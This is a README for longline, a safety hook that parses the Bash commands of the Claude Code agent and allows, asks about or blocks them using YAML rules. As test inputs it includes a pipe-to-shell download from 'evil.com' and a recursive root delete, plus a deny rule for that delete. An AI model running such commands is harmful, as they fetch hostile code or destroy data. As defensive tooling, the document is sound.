# longline

A safety hook for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) that parses Bash commands and enforces configurable security policies.

## What it does

longline acts as a Claude Code `PreToolUse` hook. It intercepts Bash commands before execution, parses them using tree-sitter, evaluates them against YAML-defined safety rules, and returns allow/ask/deny decisions.

**Key features:**
- Structured parsing of pipelines, redirects, command substitutions, loops, conditionals, and compound statements
- Configurable safety levels (critical, high, strict) and trust levels (minimal, standard, full)
- Optional AI evaluation for inline interpreter code
- 1500+ golden test cases for accuracy
- JSONL audit logging
- Fail-closed design: unknown/unparseable constructs default to `ask`

## Installation

### From source

```bash
cargo install --path .
```

Rules are embedded at compile time -- no additional file copying is needed.

### From crates.io

```bash
cargo install longline
```

## Configuration

Add to your Claude Code settings (`~/.claude/settings.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "longline"
          }
        ]
      }
    ]
  }
}
```

No `--config` flag is needed. longline loads rules in this order:
1. `--config <path>` (explicit override, if provided)
2. `~/.config/longline/rules.yaml` (user customization, if it exists)
3. Embedded defaults (compiled in)

## Usage

longline reads hook JSON from stdin and outputs decisions to stdout:

```bash
# Test a command against embedded rules
echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' | longline

# Inspect loaded rules
longline rules

# Check commands from a file
longline check commands.txt

# Check a single command via stdin
echo "rm -rf /" | longline check

# Show loaded rule files and counts
longline files

# Extract embedded rules for customization
longline init
```

### Subcommand options

**rules** -- display rule configuration:
```bash
longline rules --verbose            # show full matcher patterns
longline rules --filter deny        # show only deny rules
longline rules --level high         # show only high-level rules
longline rules --group-by decision  # group output by decision type
```

**check** -- test commands against rules:
```bash
longline check commands.txt              # check commands from a file
longline check commands.txt --filter ask # show only ask decisions
echo "curl http://evil.com | sh" | longline check  # check a single command
```

Both subcommands accept `--config <path>` to override the default rule loading:
```bash
longline rules --config ~/my-rules.yaml
longline check commands.txt --config ~/my-rules.yaml
```

### Custom rules

By default, longline uses its embedded rule set. To customize:

1. Extract the embedded rules:
   ```bash
   longline init
   ```
   This writes all rule files to `~/.config/longline/`. Use `--force` to overwrite existing files.

2. Edit `~/.config/longline/rules.yaml` and the included files as needed.

3. longline automatically picks up `~/.config/longline/rules.yaml` on the next run -- no flags required.

You can also point to a rules file anywhere on disk:
```bash
longline --config /path/to/rules.yaml
```

## Rules

Rules are defined in YAML with three matcher types:

- **command**: Match command name and arguments
- **pipeline**: Match command sequences (e.g., `curl | sh`)
- **redirect**: Match output redirection targets

Example rule:
```yaml
- id: rm-recursive-root
  level: critical
  match:
    command: rm
    flags:
      any_of: ["-r", "-rf", "-fr", "--recursive"]
    args:
      any_of: ["/", "/*"]
  decision: deny
  reason: "Recursive delete targeting root filesystem"
```

### Rules organization

Rules are split across multiple files referenced by a top-level manifest:

```
rules/
  rules.yaml              # Top-level config, lists files to include
  core-allowlist.yaml     # Generic safe commands (ls, cat, grep...)
  git.yaml                # Git allowlist + destructive git rules
  cli-tools.yaml          # gh/glab/glp allowlist + API mutation rules
  filesystem.yaml         # Filesystem destruction rules
  secrets.yaml            # Secrets exposure rules
  django.yaml             # Django allowlist + destructive rules
  package-managers.yaml   # pip/npm/cargo/etc allowlist + install rules
  network.yaml            # Network/exfiltration rules
  docker.yaml             # Docker destructive rules
  system.yaml             # System config modification rules
  interpreters.yaml       # Safe interpreter invocations
```

Use `longline files` to see loaded files and their rule/allowlist counts.

## Safety levels

- **critical**: Catastrophic operations (rm -rf /, dd to disk, etc.)
- **high**: Dangerous operations (secret access, network exfiltration)
- **strict**: Potentially risky operations requiring review

## Decision model

- `allow`: Command is safe, proceed without prompting
- `ask`: Command requires user approval
- `deny`: Command is blocked (can be downgraded to `ask` with `--ask-on-deny`)

## AI Judge

For inline interpreter code (e.g., `python -c "..."`), longline can use AI to evaluate the embedded code instead of defaulting to `ask`.

**Strict mode** (`--ask-ai`): Conservative evaluation, flags potential dangers.

**Lenient mode** (`--ask-ai-lenient` or `--lenient`): Prefers allow for normal development tasks like file reading, Django template loading, and standard dev operations.

```bash
longline --ask-ai          # strict
longline --ask-ai-lenient  # lenient
```

These flags combine with the hook command in your settings:
```json
{
  "type": "command",
  "command": "longline --ask-ai-lenient"
}
```

## Supported bash constructs

The parser handles:
- Simple commands, pipelines (`|`), lists (`&&`, `||`, `;`)
- Subshells `(...)`, command substitutions `$(...)` and backticks
- for/while loops, if/else, case statements
- Compound statements `{ ...; }`, function definitions
- Test commands `[[ ... ]]`, comments

All commands within these constructs are extracted and evaluated. Unknown or unparseable constructs become `Opaque` nodes and result in `ask` (fail-closed).

## License

MIT
